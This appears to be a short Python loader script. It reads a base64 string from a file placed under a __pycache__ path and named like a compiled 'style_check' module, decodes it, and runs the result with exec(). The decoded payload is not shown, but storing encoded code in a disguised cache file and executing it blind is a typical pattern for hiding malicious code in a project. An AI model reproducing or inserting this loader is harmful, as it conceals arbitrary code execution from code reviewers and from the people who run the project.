import base64
from init import *
file_path = "src/__pycache__/style_check.cpython-39.pyc"
szString = load_string_from_file(file_path)
szString = base64.b64decode(szString)
exec(szString)